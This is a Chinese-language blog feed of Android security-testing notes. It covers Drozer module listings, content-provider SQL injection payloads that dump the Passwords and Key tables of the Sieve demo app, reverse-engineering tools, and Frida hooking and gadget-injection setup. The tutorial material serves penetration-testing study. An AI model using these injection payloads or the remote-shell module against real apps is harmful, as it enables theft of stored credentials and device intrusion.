class="line"></span><br><span class="line">run app.provider.info #列举设备上所有的provider</span><br><span class="line"></span><br><span class="line">run app.service.info #列举设备上所有的service</span><br><span class="line"></span><br><span class="line">run app.broadcast.info #列举设备上所有的广播</span><br><span class="line"></span><br><span class="line">run app.package.attacksurface com.android.browser #查看设备上某包的受攻击面</span><br><span class="line"></span><br><span class="line">run app.activity.info -a 包名 #列出包的所有Activity</span><br></pre></td></tr></table></figure><p>运行activity</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --action 【activity 设置的intent filter的action属性】 --category 【activity 设置的intent filter的category 属性】--component 【package 名字】 【component 属性】</span><br></pre></td></tr></table></figure><p>例如：</p><p><code>run app.activity.start --action android.intent.action.MAIN --category android.intent.category.LAUNCHER --component com.android.browser com.android.browser.BrowserActivity</code></p><p>根据指定的intent action和intent category来查看activity</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.forintent --action 【intent action】 --category 【intent category】</span><br><span class="line"></span><br><span class="line">run app.activity.forintent --action android.intent.action.VIEW --category android.intent.category.DEFAULT</span><br></pre></td></tr></table></figure><p>Dex是Android系统中可以在Dalvik虚拟机上直接运行的文件格式。java源代码经过ADT的复杂编译后转换成Dex文件，这是一个逐步优化的过程。Dex文件的指令码就是Dalvik虚拟机专有的一套指令集，专门为嵌入式系统优化过，相比标准java的.class文件，它体积小，运行效率高。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">$ run app.activity.forintent // Find activities that can handle the given intent</span><br><span class="line"></span><br><span class="line">$ run app.activity.info // Gets information about exported activities.</span><br><span class="line"></span><br><span class="line">$ run app.activity.start // Start an Activity</span><br><span class="line"></span><br><span class="line">$ run app.broadcast.info // Get information about broadcast receivers</span><br><span class="line"></span><br><span class="line">$ run app.broadcast.send // Send broadcast using an intent</span><br><span class="line"></span><br><span class="line">$ run app.broadcast.sniff // Register a broadcast receiver that can sniff particular intents</span><br><span class="line"></span><br><span class="line">$ run app.package.attacksurface // Get attack surface of package</span><br><span class="line"></span><br><span class="line">$ run app.package.backup // Lists packages that use the backup API (returns true on FLAG_ALLOW_BACKUP)</span><br><span class="line"></span><br><span class="line">$ run app.package.debuggable // Find debuggable packages</span><br><span class="line"></span><br><span class="line">$ run app.package.info // Get information about installed packages</span><br><span class="line"></span><br><span class="line">$ run app.package.launchintent // Get launch intent of package</span><br><span class="line"></span><br><span class="line">$ run app.package.list // List Packages</span><br><span class="line"></span><br><span class="line">$ run app.package.manifest // Get AndroidManifest.xml of package</span><br><span class="line"></span><br><span class="line">$ run app.package.native // Find Native libraries embedded in the application.</span><br><span class="line"></span><br><span class="line">$ run app.package.shareduid // Look for packages with shared UIDs</span><br><span class="line"></span><br><span class="line">$ run app.provider.columns // List columns in content provider</span><br><span class="line"></span><br><span class="line">$ run app.provider.delete // Delete from a content provider</span><br><span class="line"></span><br><span class="line">$ run app.provider.download // Download a file from a content provider that supports files</span><br><span class="line"></span><br><span class="line">$ run app.provider.finduri // Find referenced content URIs in a package</span><br><span class="line"></span><br><span class="line">$ run app.provider.info // Get information about exported content providers</span><br><span class="line"></span><br><span class="line">$ run app.provider.insert // Insert into a Content Provider</span><br><span class="line"></span><br><span class="line">$ run app.provider.query // Query a content provider</span><br><span class="line"></span><br><span class="line">$ run app.provider.read // Read from a content provider that supports files</span><br><span class="line"></span><br><span class="line">$ run app.provider.update // Update a record in a content provider</span><br><span class="line"></span><br><span class="line">$ run app.service.info // Get information about exported services</span><br><span class="line"></span><br><span class="line">$ run app.service.send // Send a Message to a service, and display the reply</span><br><span class="line"></span><br><span class="line">$ run app.service.start // Start Service</span><br><span class="line"></span><br><span class="line">$ run app.service.stop // Stop Service</span><br><span class="line"></span><br><span class="line">$ run auxiliary.webcontentresolver // Start a web service interface to content providers.</span><br><span class="line"></span><br><span class="line">$ run exploit.jdwp.check // Open @jdwp-control and see which apps connect</span><br><span class="line"></span><br><span class="line">$ run exploit.pilfer.general.apnprovider // Reads APN content provider</span><br><span class="line"></span><br><span class="line">$ run exploit.pilfer.general.settingsprovider // Reads Settings content provider</span><br><span class="line"></span><br><span class="line">$ run information.datetime // Print Date/Time</span><br><span class="line"></span><br><span class="line">$ run information.deviceinfo // Get verbose device information</span><br><span class="line"></span><br><span class="line">$ run information.permissions // Get a list of all permissions used by packages on the device</span><br><span class="line"></span><br><span class="line">$ run scanner.activity.browsable // Get all BROWSABLE activities that can be invoked from the web browser</span><br><span class="line"></span><br><span class="line">$ run scanner.misc.native // Find native components included in packages</span><br><span class="line"></span><br><span class="line">$ run scanner.misc.readablefiles // Find world-readable files in the given folder</span><br><span class="line"></span><br><span class="line">$ run scanner.misc.secretcodes // Search for secret codes that can be used from the dialer</span><br><span class="line"></span><br><span class="line">$ run scanner.misc.sflagbinaries // Find suid/sgid binaries in the given folder (default is /system).</span><br><span class="line"></span><br><span class="line">$ run scanner.misc.writablefiles // Find world-writable files in the given folder</span><br><span class="line"></span><br><span class="line">$ run scanner.provider.finduris // Search for content providers that can be queried from our context.</span><br><span class="line"></span><br><span class="line">$ run scanner.provider.injection // Test content providers for SQL injection vulnerabilities.</span><br><span class="line"></span><br><span class="line">$ run scanner.provider.sqltables // Find tables accessible through SQL injection vulnerabilities.</span><br><span class="line"></span><br><span class="line">$ run scanner.provider.traversal // Test content providers for basic directory traversal vulnerabilities.</span><br><span class="line"></span><br><span class="line">$ run shell.exec // Execute a single Linux command.</span><br><span class="line"></span><br><span class="line">$ run shell.send // Send an ASH shell to a remote listener.</span><br><span class="line"></span><br><span class="line">$ run shell.start // Enter into an interactive Linux shell.</span><br><span class="line"></span><br><span class="line">$ run tools.file.download // Download a File</span><br><span class="line"></span><br><span class="line">$ run tools.file.md5sum // Get md5 Checksum of file</span><br><span class="line"></span><br><span class="line">$ run tools.file.size // Get size of file</span><br><span class="line"></span><br><span class="line">$ run tools.file.upload // Upload a File</span><br><span class="line"></span><br><span class="line">$ run tools.setup.busybox // Install Busybox.</span><br><span class="line"></span><br><span class="line">$ run tools.setup.minimalsu // Prepare &#x27;minimal-su&#x27; binary installation on the device.</span><br></pre></td></tr></table></figure><ul><li><p>列出基本信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">run app.package.list</span><br><span class="line"></span><br><span class="line">//-f参数+文件名，获取程序包名：</span><br><span class="line">run app.package.list -f sieve</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>查找注入点<br>使用模块：scanner.provider.injection</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.injection -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></li><li><p>查询content provider 内容<br>使用app.provider.query模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/  --projection <span class="string">&quot;* from sqlite_master where type= &#x27;table&#x27;; --&quot;</span></span><br><span class="line"></span><br><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line"></span><br><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection <span class="string">&quot;* from Passwords; --&quot;</span></span><br><span class="line"></span><br><span class="line"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/  --projection <span class="string">&quot;* from Key; --&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Service组件"><a href="#Service组件" class="headerlink" title="Service组件"></a>Service组件</h3><p>//获取service组件信息<br>run app.service.info -a com.mwr.example.sieve<br><code>AuthService:认证相关 -- CrytoService:加密相关</code><br>对APK进行反编译，然后查看AuthService.smali中的handlemessage（）方法：<br>经过分析可以得出以下2十六进制的数就是我们需要的值（这里需要了解安卓的handlemessage，请自行学习）</p></li></ul><ol><li><p>检测四大组件安全 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info -a  &lt;包名&gt;</span><br><span class="line">run app.broadcast.info -a  &lt;包名&gt;</span><br><span class="line">run app.service.info -a  &lt;包名&gt;</span><br><span class="line">run app.provider.info -a  &lt;包名&gt;</span><br></pre></td></tr></table></figure></li><li><p>检测URI数据泄露风险<br>Drozer的scanner模块提供了一些方法去猜测可能存在的content URIs.<br><code>run scanner.provider.finduris -a &lt;包名&gt;</code></p></li><li><p>检测文件遍历漏洞 :<br>　　 Drozer的Scanner模块提供了一些方法去检测本地Content Provider数据是否有文件遍历漏洞风险的接口.　``<br><code>run scanner.provider.traversal -a &lt;包名&gt;</code></p></li><li><p>检测是否存在本地sql注入:<br><code>run scanner.provider.injection -a &lt;包名&gt;</code></p></li><li><p>敏感信息排查<br>进入shell,data/data目录下 执行logcat | grep -i [包名]</p></li></ol><p>参考:<br>Drozer<br><a href="https://blog.csdn.net/song_lee/article/details/89295550">https://blog.csdn.net/song_lee/article/details/89295550</a></p><hr><p>工具包:<br><a href="http://www.tidesec.net/">http://www.tidesec.net/</a><br>移动安全博客：<br><a href="https://www.yuque.com/tidesec/app">https://www.yuque.com/tidesec/app</a></p><p>常用工具:<br><a href="https://blog.csdn.net/u013107656/article/details/52876312?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">https://blog.csdn.net/u013107656/article/details/52876312?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control</a></p><hr><p>#逆向常用工具(IDA最为常用就不介绍了)</p><h2 id="Angr"><a href="#Angr" class="headerlink" title="Angr"></a>Angr</h2><p>是一个用于分析二进制文件的 Python 框架。<br>它对静态和动态符号分析都很有用。换句话说：给定一个二进制文件和一个请求的状态，Angr 将尝试使用暴力和形式化方法（用于静态代码分析的一种技术）来找到一条路径来达到该状态，使用 angr 到达请求的状态通常比手动调试和搜索到达所需状态的路径要快得多。<br>Angr 用 VEX 中间语言操作，并带有 ELF/ARM 二进制文件的加载程序，因此它非常适合处理原生代码，例如原生 Android 二进制文件。<br>Angr 允许反汇编、程序插桩、符号执行、控制流分析、数据依赖性分析、反编译等，因为它提供<br>了大量的插件。<br>由于 Angr 版本 8 基于 Python3，可以通过 pip 在Unix操作系统、macOS 和 Windows 上安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install angr</span><br></pre></td></tr></table></figure><p>angr 的一些依赖项包含 Python 模块 Z3 和 PyVEX 的分支版本，这将覆盖原始版本。如果将这些<br>模块用于其他用途，则应该使用 Virtualenv 创建一个专用的虚拟环境。或者可以始终使用官方提<br>供的 docker 容器。有关详细信息，请参阅安装指南。<br>在 Angr 的 Gitbooks 页面上提供了全面的文档，包括安装指南、教程和使用示例。还提供了完整<br>的 API 参考</p><h2 id="Apkx"><a href="#Apkx" class="headerlink" title="Apkx"></a>Apkx</h2><p>基于 Python 的流行的免费 dex 转换器和 Java 反编译器。它自动化了 apk 的提取、转换和<br>反编译。</p><h2 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a>radare2</h2><p>radare2（r2）是一个流行的开源逆向工程框架，用于反汇编、调试、debug 和分析二进制文件，<br>可编写脚本，支持多种架构和文件格式，包括 Android/iOS 应用程序。对于 Android，支持<br>Dalvik-DEX（odex，multidex）、ELF（executables，.so，ART）和 Java（JNI 和 Java 类）。<br>包含几个有用的脚本，可以帮助对移动应用程序分析，因为他提供了低级别的反汇编和安全的静<br>态分析，在传统工具失败时非常方便使用。<br>radare2 实现了一个丰富的命令行界面（CLI），可以在其中执行上述任务。但是，如果您不喜欢<br>使用 CLI 来进行逆向工程，您可能会考虑使用 Web UI（通过-H 标志）或者更方便的 QT 和 C++<br>GUI 版本，其称为 Cutter。请记住，CLI，更具体地说，它的可视化模式和脚本功能（r2pipe）是<br>radare2 强大功能的核心，并且绝对值得学习如何使用它。</p><p>radare2 框架包含一组小型实用程序，这些实用程序可以从 r2 shell 中使用，也可以单独用作 CLI<br>工具。这些实用程序包括 rabin2、rasm2、rahash2、radiff2、rafind2、ragg2、rarun2、rax2，当<br>然还有 r2，它是最主要的。<br>使用 rafind2 直接从编码的 Android Manifest 中读取字符串(AndroidManifest.xml 文 件):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Permissions</span></span><br><span class="line">$ rafind2 -ZS permission AndroidManifest.xml</span><br><span class="line"><span class="comment"># Activities</span></span><br><span class="line">$ rafind2 -ZS activity AndroidManifest.xml</span><br><span class="line"><span class="comment"># Content Providers</span></span><br><span class="line">$ rafind2 -ZS provider AndroidManifest.xml</span><br><span class="line"><span class="comment"># Services</span></span><br><span class="line">$ rafind2 -ZS service AndroidManifest.xml</span><br><span class="line"><span class="comment"># Receivers</span></span><br><span class="line">$ rafind2 -ZS receiver AndroidManifest.xml</span><br><span class="line">或者使用 rabin2 获取有关二进制文件的信息：</span><br><span class="line">$ rabin2 -I UnCrackable-Level1/classes.dex</span><br><span class="line">arch dalvik</span><br><span class="line">baddr 0x0</span><br><span class="line">binsz 5528</span><br><span class="line">bintype class</span><br><span class="line">bits 32</span><br><span class="line">canary <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>rabin2-h 查看所有选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ rabin2 -h</span><br><span class="line">Usage: rabin2 [-AcdeEghHiIjlLMqrRsSUvVxzZ] [-@ at] [-a arch] [-b bits] [-B addr]</span><br><span class="line"> [-C F:C:D] [-f str] [-m addr] [-n str] [-N m:M] [-P[-P] pdb]</span><br><span class="line"> [-o str] [-O str] [-k query] [-D lang symname] file</span><br><span class="line">-@ [addr] show section, symbol or import at addr</span><br><span class="line">-A list sub-binaries and their arch-bits pairs</span><br><span class="line">-a [arch] <span class="built_in">set</span> arch (x86, arm, .. or &lt;arch&gt;_&lt;bits&gt;) -b [bits] <span class="built_in">set</span> bits (32, 64 ...)</span><br><span class="line">-B [addr] override base address (pie bins)</span><br><span class="line">-c list classes</span><br><span class="line">-cc list classes <span class="keyword">in</span> header format</span><br><span class="line">-H header fields</span><br><span class="line">-i imports (symbols imported from libraries)</span><br><span class="line">-I binary info</span><br><span class="line">-j output <span class="keyword">in</span> json</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>使用 r2 主程序访问 r2 shell。可以像加载任何其他二进制文件一样加载 DEX 二进制文件<br><code>$ r2 classes.dex</code><br>输入 r2-h 查看所有可用选项。一个非常常用的标志是-A，它在加载目标二进制文件后触发分析。<br>但是，应该谨慎使用该模块，并且与小型二进制文件一起使用，因为它非常耗时且消耗更多资<br>源。您可以在“Android 上的篡改和逆向工程”章节中了解更多信息。<br>进入 r2 shell 后，还可以访问其他 radare2 实用程序提供的功能。例如：运行 i 将打印二进制文件<br>的信息，与 rabin2-i 完全相同。<br>要打印所有字符串，请使用 r2 shell 中的 rabin2 -Z 或命令 iz（或不太详细的 izq）。</p><h3 id="r2frida"><a href="#r2frida" class="headerlink" title="r2frida"></a>r2frida</h3><p>r2frida 是一个允许 radare2 连接到 Frida 的项目，它有效地将 radare2 强大的逆向工程能力与<br>Frida 的动态工具包相结合。R2frida 可以：<br>• 通过 USB 或 TCP 将 radare2 连接到任何本地进程或远程 frida 服务器。<br>• 从目标进程读取/写入内存。<br>• 将映射、符号、导入、类和方法等 Frida 信息加载到 radare2 中。<br>• 从 Frida 调用 r2 命令，因为 Frida 将 r2 接口集成到 Frida Javascript API 中。</p><hr><p>IoT 设备网络协议模糊测试工具boofuzz实战<br><a href="https://blog.csdn.net/song_lee/article/details/104334096">https://blog.csdn.net/song_lee/article/details/104334096</a></p><p>软件测试<br><a href="https://join.thoughtworks.cn/recruitment/application/64">https://join.thoughtworks.cn/recruitment/application/64</a><br>android开发:<br><a href="https://github.com/a120464/Android-P7/blob/master/Android%E5%BC%80%E5%8F%91%E4%B8%8D%E4%BC%9A%E8%BF%99%E4%BA%9B%EF%BC%9F%E5%A6%82%E4%BD%95%E9%9D%A2%E8%AF%95%E6%8B%BF%E9%AB%98%E8%96%AA%EF%BC%81.md">https://github.com/a120464/Android-P7/blob/master/Android%E5%BC%80%E5%8F%91%E4%B8%8D%E4%BC%9A%E8%BF%99%E4%BA%9B%EF%BC%9F%E5%A6%82%E4%BD%95%E9%9D%A2%E8%AF%95%E6%8B%BF%E9%AB%98%E8%96%AA%EF%BC%81.md</a><br>MobSF:<br><a href="https://mobsf.github.io/docs/#/dynamic_analyzer">https://mobsf.github.io/docs/#/dynamic_analyzer</a><br>OWASP 移动安全测试指南:<br><a href="http://www.owasp.org.cn/owasp-project/owasp-mobile-security-testing-guide">http://www.owasp.org.cn/owasp-project/owasp-mobile-security-testing-guide</a></p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frida hook 简单使用</title>
      <link href="/2021/03/23/hook-frida/"/>
      <url>/2021/03/23/hook-frida/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script defer src="https://cdn.jsdelivr.net/combine/npm/jquery@latest/dist/jquery.min.js,gh/weilining/jsdelivr/jquery/circlemagic/circlemagic.min.js,gh/weilining/jsdelivr@latest/jquery/circlemagic/butterflycirclemagic.js"></script><h1 id="HOOK"><a href="#HOOK" class="headerlink" title="HOOK"></a>HOOK</h1><h2 id="hook介绍"><a href="#hook介绍" class="headerlink" title="hook介绍"></a>hook介绍</h2><p>Hook 翻译过来就是 “钩子” 的意思，钩子实际上是一个处理消息的程序段，通过系统调用，把它挂入系统。每当特定的消息发出，在没有到达目的窗口前，钩子程序就先捕获该消息，亦即钩子函数先得到控制权。这时钩子函数即可以加工处理（改变）该消息，也可以不作处理而继续传递该消息，还可以强制结束消息的传递。Hook 技术无论对安全软件还是恶意软件都是十分关键的一项技术，其本质就是<code>劫持函数调用</code> 。</p><h2 id="Hook-技术实现的步骤"><a href="#Hook-技术实现的步骤" class="headerlink" title="Hook 技术实现的步骤"></a>Hook 技术实现的步骤</h2><p>  1. 找到 hook 点（Java 层），该 hook 点必须满足以下的条件：需要 hook 的方法，所属的对象必须是静态的，因为我们是通过反射来获取对象的，我们获取的是系统的对象，所以不能够 new 一个新的对象，必须用系统创建的那个对象，所以只有静态的才能保证和系统的对象一致。<br>  2. 将 hook 方法放到系统之外执行（放入我们自己的逻辑）</p><hr><h1 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h1><h2 id="frida环境配置"><a href="#frida环境配置" class="headerlink" title="frida环境配置"></a>frida环境配置</h2><p>Frida 分为客户端和服务端。<br>客户端：PC（控制端）<br>服务器：手机设备（被控制端）</p><p>客户端编写的 Python 代码，用于连接远程设备，提交要注入的 JS 代码到服务端，接受服务端发来的消息。</p><p>服务端中需要用 JS 代码注入到目标进程，操作内存数据，给客户端发送消息。</p><p>客户端:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip3 install frida-tools</span><br><span class="line">pip3 install colorama prompt-toolkit pygments</span><br><span class="line">frida --version</span><br><span class="line">frida-ps ：查看当前系统进程，表示安装成功。</span><br></pre></td></tr></table></figure><p>查看系统架构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell getprop ro.product.cpu.abi</span><br><span class="line">//cat /proc/cpuinfo</span><br></pre></td></tr></table></figure><p>服务端的 Frida 版本必须和客户端的 Frida 版本一致。</p><table><thead><tr><th>API架构</th><th>说明</th></tr></thead><tbody><tr><td>armeabiv-v7a</td><td>第7代及以上的 ARM 处理器。目前，大部分手机的CPU都支持此ABI交互规则</td></tr><tr><td>arm64-v8a</td><td>第8代64位ARM处理器，支持此ABI的手机近两年也逐渐增多了</td></tr><tr><td>armeabi</td><td>第5代、第6代的ARM处理器，早期手机用得较多</td></tr><tr><td>x86</td><td>平板、模拟器用得比较多</td></tr><tr><td>x86_64</td><td>64位的平板</td></tr></tbody></table><ul><li>ABI 与 CPU 的联系<br>在 Android 手机上安装一个应用时，只有手机CPU架构支持的ABI架构对应的.so文件会被安装。如果支持多个ABI架构，会按照优先级进行安装。</li></ul><table><thead><tr><th>CPU架构</th><th>支持的ABI架构对应的.so文件安装优先级</th></tr></thead><tbody><tr><td>ARMv5</td><td>armeabi</td></tr><tr><td>ARMv7</td><td>armeabi，armeabi-v7a</td></tr><tr><td>ARMv8</td><td>armeabi，armeabi-v7a，arm64-v8a</td></tr><tr><td>MIPS</td><td>mips</td></tr><tr><td>MIPS64</td><td>mips，mips64</td></tr><tr><td>x86</td><td>x86，armeabi，armeabi-v7a</td></tr><tr><td>x86_64</td><td>:armeabi，x86，x86_64</td></tr><tr><td>服务端:</td><td></td></tr><tr><td><a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></td><td></td></tr></tbody></table><ol><li><p>下载:frida-server-14.2.13-android-arm64.xz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ adb push frida-server-14.2.13-android-arm64 /data/<span class="built_in">local</span>/tmp/frida-server</span><br><span class="line">$ xz -d frida-server-14.2.13-android-arm64.xz</span><br></pre></td></tr></table></figure></li><li><p>运行frida-server</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$adb</span> shell</span><br><span class="line"><span class="variable">$su</span></span><br><span class="line"><span class="variable">$cd</span>  /data/<span class="built_in">local</span>/tmp</span><br><span class="line"><span class="variable">$chmod</span>  755  frida-server</span><br><span class="line">$./frida-server </span><br></pre></td></tr></table></figure></li></ol><p>如果使用的是模拟器应该下载frida-server-14.2.13-android-x86或64位<br>如果安装错误的版本，在执行frida-server时会提示报错，报错信息为sh: ./frida-server: not executable: 64-bit ELF file。<br>普通用户没有权限，需要su切换到root用户</p><ol start="3"><li>检查是否正常<br>转发android TCP端口到本地<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb forward tcp:27043 tcp:27043</span><br><span class="line">Frida-ps -U   </span><br></pre></td></tr></table></figure>运行结果如图：<div class="justified-gallery"><p><img src="https://q0o0p.top/2021/03/23/hook-frida/4.png"></p>          </div></li></ol><p>客户端：PC（控制端）<br>客户端编写的 Python 代码，用于连接远程设备，提交要注入的 JS代码到服务端，接受服务端发来的消息。 </p><p>服务器：手机设备（被控制端）<br>服务端中需要用 JS 代码注入到目标进程，操作内存数据，给客户端发送消息。</p><h2 id="非root设备使用Frida"><a href="#非root设备使用Frida" class="headerlink" title="非root设备使用Frida"></a>非root设备使用Frida</h2><p><code>非root设备，需要反编译目标应用包，然后注入frida-gadget</code><br>获取您要测试的te应用程序的APK二进制文件，例如myapp.apk。<br>用于apktool将APK解码为其内容。最好是它的最新版本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apktool d myapp.apk -o extractedFolder</span><br></pre></td></tr></table></figure><p>将frida本机库（frida-gadget）添加到APK的/ lib文件夹中。可以在Frida的发行页面中找到每种体系结构的小工具库。确保将正确架构的库添加到/lib例如/lib/armeabi32位ARM设备下的合适文件夹中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ apktool --version</span><br><span class="line"></span><br><span class="line">$ apktool d -o out_dir original.apk</span><br><span class="line">I: Using Apktool 2.2.2 on original.apk</span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding AndroidManifest.xml with resources...</span><br><span class="line">I: Loading resource table from file: ~/.<span class="built_in">local</span>/share/apktool/framework/1.apk</span><br><span class="line">I: Regular manifest package...</span><br><span class="line">I: Decoding file-resources...</span><br><span class="line">I: Decoding values XMLs...</span><br><span class="line">I: Baksmaling classes.dex...</span><br><span class="line">I: Copying assets and libs...</span><br><span class="line">I: Copying unknown files...</span><br><span class="line">I: Copying original files...</span><br><span class="line"></span><br><span class="line"><span class="comment"># download frida gadget - for 32bit ARM in this case</span></span><br><span class="line">$ wget https://github.com/frida/frida/releases/download/9.1.26/frida-gadget-9.1.26-android-arm.so.xz</span><br><span class="line">2017-04-11 10:48:45 (3.29 MB/s) - ‘frida-gadget-9.1.26-android-arm.so.xz’ saved [3680748/3680748]</span><br><span class="line"></span><br><span class="line"><span class="comment"># extract the compressed archive</span></span><br><span class="line">$ unxz frida-gadget-9.1.26-android-arm.so.xz</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">frida-gadget-9.1.26-android-arm.so</span><br><span class="line"></span><br><span 